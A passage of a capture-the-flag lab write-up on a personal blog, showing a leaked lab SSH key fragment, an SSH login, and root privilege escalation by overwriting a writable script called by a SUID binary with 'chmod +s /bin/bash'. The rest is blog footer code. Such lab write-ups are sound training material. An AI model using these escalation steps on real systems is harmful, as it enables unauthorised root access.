+qQGZ0OxEGY/5ELju1VS5N/PbL1/Db6FEWZtiuTVPQdUntoQ1tkZfc0wwUSTfWvxUtQJ8UG
+OjNIJwheLQzbklQjLu0Y3l8+A3Ve7UXMfK7Q6rV86GkhUBcXMS8454vE5AsvprC7km7K6l
+O/7dFLMYo/OOMwAAABVhcnZpbmRAYXJ2aW5kbGF6eWNvcnABAgME
+-----END OPENSSH PRIVATE KEY-----</pre></div>
+<p>We then copy the private key to our attacker's machine and ssh into the target host using ssh for a more stable shell and another user.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/lazzycorp » vim id_rsa
+kali :: exercises/HMV/lazzycorp » chmod 600 id_rsa</pre></div>
+<p>For the next step to work, don't forget to set the right permission. which is (600) on the private key file, which translates to <code class="notranslate">read+write</code> in linux terms</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali :: exercises/HMV/lazzycorp » ssh arvind@10.9.9.12 -i id_rsa                                             130 ↵
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
+
+ <span class="pl-k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="pl-k">*</span> Management:     https://landscape.canonical.com
+ <span class="pl-k">*</span> Support:        https://ubuntu.com/pro
+
+ System information as of Thu 21 Aug 2025 04:33:01 AM UTC
+
+  System load:  0.0               Processes:               137
+  Usage of /:   56.9% of 8.02GB   Users logged in:         0
+  Memory usage: 25%               IPv4 address <span class="pl-k">for</span> enp0s3: 10.9.9.12
+  Swap usage:   0%
+
+ <span class="pl-k">*</span> Ubuntu 20.04 LTS Focal Fossa has reached its end of standard support on 31 Ma
+
+   For more details see:
+   https://ubuntu.com/20-04
+
+Expanded Security Maintenance <span class="pl-k">for</span> Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+31 additional security updates can be applied with ESM Infra.
+Learn more about enabling ESM Infra service <span class="pl-k">for</span> Ubuntu 20.04 at
+https://ubuntu.com/20-04
+
+
+The list of available updates is more than a week old.
+To check <span class="pl-k">for</span> new updates run: sudo apt update
+
+Welcome to LazyCorp. No flags here, go back.
+Last login: Wed Jul 16 12:24:12 2025
+arvind@arvindlazycorp:<span class="pl-k">~</span>$ whoami
+arvind
+arvind@arvindlazycorp:<span class="pl-k">~</span>$ id
+uid=1000(arvind) gid=1000(arvind) groups=1000(arvind),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lxd)</pre></div>
+<h4>From arvind-&gt; root</h4>
+<p>Upon login with the arvind user, we then find the <code class="notranslate">reset</code> file which resets the webservers and it has the SUID permissions</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">arvind@arvindlazycorp:<span class="pl-k">~</span>$ ls -la
+total 60
+drwxr-xr-x 5 arvind arvind  4096 Jul 16 12:49 <span class="pl-c1">.</span>
+drwxr-xr-x 3 root   root    4096 Jul  5 14:44 ..
+-rw------- 1 arvind arvind    16 Jul 16 12:50 .bash_history
+-rw-r--r-- 1 arvind arvind   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 arvind arvind  3771 Feb 25  2020 .bashrc
+drwx------ 2 arvind arvind  4096 Jul  5 14:45 .cache
+drwxrwxr-x 3 arvind arvind  4096 Jul  7 08:50 .local
+-rw-r--r-- 1 arvind arvind   807 Feb 25  2020 .profile
+-rwsr-xr-x 1 root   root   16744 Jul 16 12:22 reset
+drwxr-xr-x 2 arvind arvind  4096 Jul  9 07:37 .ssh
+-rw-r--r-- 1 arvind arvind     0 Jul  5 14:45 .sudo_as_admin_successful
+-rw-r--r-- 1 arvind arvind    28 Jul 16 10:26 user.txt</pre></div>
+<p>Trying to find out how the <code class="notranslate">reset</code> file works, I ran the <code class="notranslate">strings</code> command on it and found this interesting line</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">arvind@arvindlazycorp:<span class="pl-k">~</span>$ strings reset
+<span class="pl-k">&lt;</span>SNIP<span class="pl-k">&gt;</span>
+/usr/bin/reset_site.sh
+<span class="pl-k">&lt;</span>SNIP<span class="pl-k">&gt;</span></pre></div>
+<p>this means when we execute the file <code class="notranslate">reset</code> it runs this command under the hood. Trying to learn more about the file, we see that <code class="notranslate">arvind</code> user has full access to it.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">arvind@arvindlazycorp:<span class="pl-k">~</span>$ ls -la /usr/bin/reset_site.sh
+-rwxrwxr-x 1 root arvind 254 Jul  9 10:26 /usr/bin/reset_site.sh</pre></div>
+<p>and the following are the contents of the file</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">arvind@arvindlazycorp:<span class="pl-k">~</span>$ cat /usr/bin/reset_site.sh
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>[*] Resetting website from backup...<span class="pl-pds">"</span></span>
+
+<span class="pl-c"><span class="pl-c">#</span> Remove current site</span>
+rm -rf /var/www/html/<span class="pl-k">*</span>
+<span class="pl-c"><span class="pl-c">#</span> Restore from backup</span>
+cp -r /opt/backup/<span class="pl-k">*</span> /var/www/html/
+<span class="pl-c"><span class="pl-c">#</span> Set correct ownership</span>
+chown -R www-data:www-data /var/www/html/
+
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>[+] Done resetting.<span class="pl-pds">"</span></span></pre></div>
+<p>It's a simple file that works by removing the current site directory and copies a backup of the file to the same directory.</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">arvind@arvindlazycorp:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>chmod +s /bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /usr/bin/reset_site.sh
+arvind@arvindlazycorp:<span class="pl-k">~</span>$ ./reset
+arvind@arvindlazycorp:<span class="pl-k">~</span>$ bash -p
+bash-5.0# id
+uid=1000(arvind) gid=1000(arvind) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lxd),1000(arvind)</pre></div>
+<p>The above commands copies a privilege escalation command into the script and when you execute the <code class="notranslate">reset</code> program, it also runs the other command that was appended in the file. In this case we set the <code class="notranslate">SUID</code> bit to the <code class="notranslate">/bin/bash</code> program and then run <code class="notranslate">bash -p</code><br>
+root flag</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">bash-5.0# <span class="pl-c1">cd</span> /root
+bash-5.0# cat root.txt
+FLAG{lazycorp_reset_exploit_worked}</pre></div>
+<h3>Lesson Learnt</h3>
+<p>Web server paths on Linux systems are case-sensitive.</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">comments</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://cyxteen.github.io">Cyxt33n Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="run "+diffDay+" days"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","Cyxteen/cyxteen.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
